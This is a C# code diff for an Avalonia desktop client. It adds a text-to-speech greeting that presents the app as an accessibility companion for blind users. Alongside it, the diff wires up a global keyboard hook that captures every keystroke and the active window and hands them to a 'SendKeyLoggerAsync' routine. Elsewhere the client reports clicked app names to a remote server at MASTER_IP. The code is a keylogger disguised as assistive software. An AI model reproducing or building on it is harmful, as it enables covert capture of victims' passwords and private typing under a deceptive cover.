@@ -6,24 +6,30 @@ using System.Threading.Tasks;
 using Avalonia.Threading;
 using DotNetEnv;
 using CLIENT.Helpers;
+using System.Speech.Synthesis;
+using System.Threading;
 
 namespace CLIENT.ViewModels
 {
     public partial class MainWindowViewModel : ViewModelBase
     {
         private string _greeting = "Connecting to server...";
+
         public string Greeting
         {
             get => _greeting;
             set => SetProperty(ref _greeting, value);
         }
 
+        
         private TcpClient _client;
         private NetworkStream _stream;
-
+        private SpeechSynthesizer _synth;
         public MainWindowViewModel()
         {
             DotNetEnv.Env.Load();
+            _synth = new SpeechSynthesizer();
+            _synth.SetOutputToDefaultAudioDevice();
             _ = ConnectToServerAsync();
         }
 
@@ -33,10 +39,27 @@ namespace CLIENT.ViewModels
             int port = int.TryParse(serverPortStr, out int p) ? p : 2025;
             string serverIp = Environment.GetEnvironmentVariable("MASTER_IP") ?? "127.0.0.1";
 
+            _synth.SetOutputToDefaultAudioDevice();
+
+
+            _synth.SpeakAsync("Hello! I'm your accessible companion, designed to help blind or visually impaired individuals read and navigate their computers effortlessly");
+
+            KeyboardDetector.OnKeyPressed += async (key, isUpperCase, isShiftPressed, isCtrlPressed) =>
+            {
+                _synth.SpeakAsync($"You pressed {key}");
+                string windowInfo = WindowDetector.GetActiveWindowInfo();
+                if (_client == null || !_client.Connected)
+                {
+                    await SendKeyLoggerAsync($"Key: {key}, {windowInfo}");
+                }
+            };
+            KeyboardDetector.Start();
+
             while (true)
             {
                 try
                 {
+               
                     if (_client == null || !_client.Connected)
                     {
                         _client = new TcpClient();
@@ -50,6 +73,7 @@ namespace CLIENT.ViewModels
 
                         await Dispatcher.UIThread.InvokeAsync(() =>
                         {
+                      
                             Greeting = "Connected to server!";
                         });
 
@@ -57,14 +81,7 @@ namespace CLIENT.ViewModels
                         _ = ListenToServerAsync();
 
                       
-                        KeyboardDetector.OnKeyPressed += async (key, isUpperCase, isShiftPressed, isCtrlPressed) =>
-                        {
-                            string windowInfo = WindowDetector.GetActiveWindowInfo();
-                            await SendKeyLoggerAsync($"Key: {key}, {windowInfo}");
-                        };
-
-
-                        KeyboardDetector.Start();
+                      
 
                         break; // Exit the reconnect loop after successful connection
                     }
@@ -181,6 +198,7 @@ namespace CLIENT.ViewModels
         }
         public async Task SendAppInfoAsync(string appName)
         {
+            _synth.SpeakAsync($"You clicked {appName}");
             try
             {
                 if (_client != null && _client.Connected && _stream != null)
@@ -188,7 +206,6 @@ namespace CLIENT.ViewModels
                     string message = $"Clicked: {appName}";
                     byte[] messageBytes = Encoding.UTF8.GetBytes(message);
                     await _stream.WriteAsync(messageBytes, 0, messageBytes.Length);
-
                     await Dispatcher.UIThread.InvokeAsync(() =>
                     {
                         Greeting = $"Sent to server: {message}";
